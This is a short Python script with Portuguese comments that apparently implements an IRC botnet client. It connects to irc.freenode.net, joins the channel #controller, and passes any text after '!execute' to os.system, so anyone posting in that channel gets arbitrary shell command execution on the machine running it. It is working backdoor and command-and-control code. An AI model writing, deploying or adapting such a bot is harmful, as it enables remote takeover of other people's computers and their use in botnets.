# -*- coding: utf-8 -*-

import socket
import os

while True:
	network = 'irc.freenode.net'
	#network = 'seu canal IRC aqui'
	port = 6667
	irc = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
	irc.connect ( ( network, port ) )
	irc.send ( 'NICK pypyBOT-v1\r\n' )
	irc.send ( 'USER pypyBOT-v1 pypyBOT-v1 pypyBOT-v1 :pypyBOT-v1-PC\r\n' )
	#sequencia de codigos para para abrir socket com um canal do IRC

	while True:
		data = irc.recv ( 4096 )

		if data.find ( 'PING' ) != -1:
			irc.send ( 'PONG ' + data.split() [ 1 ] + '\r\n' )
			#responder mensagem do servidor para se manter conectado

		if (data.find ( '!execute' ) != -1):
			comando = data.split("!execute")

			irc.send ( 'PRIVMSG #controller :executando o comando: ' +  comando[1] +  '\r\n')

			os.system(comando[1])		
			#se encontrar a palavra "!execute", entao execute o comando em frente a essa palavra

		print(data)
		#print("rodando")
		irc.send ( 'JOIN #controller\r\n' )
		#o bot vai se conectar ao canal "#controller"
